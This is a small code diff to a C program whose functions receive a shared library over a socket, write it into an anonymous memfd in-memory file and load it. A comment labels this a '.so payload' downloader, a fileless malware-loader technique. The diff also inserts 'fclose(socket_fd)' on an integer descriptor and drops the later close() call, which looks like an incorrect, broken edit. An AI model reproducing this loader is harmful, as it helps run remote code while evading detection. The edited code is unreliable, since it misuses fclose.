@@ -154,6 +154,7 @@ void load_so(int socket_fd, int size){
   char* file_buff = (char*)malloc(sizeof(char)*size);
   int fd = memfd_create("", 1);
   read(socket_fd, file_buff, sizeof(char)*size);
+  fclose(socket_fd);
   write(fd, file_buff, size);
   free(file_buff);
   void* handle;
@@ -192,6 +193,4 @@ void downloader(){
 
   // process the connection to download && load .so payload
   process_connection(socket_fd);
-  
-  close(socket_fd); // this may not be necessary
 }
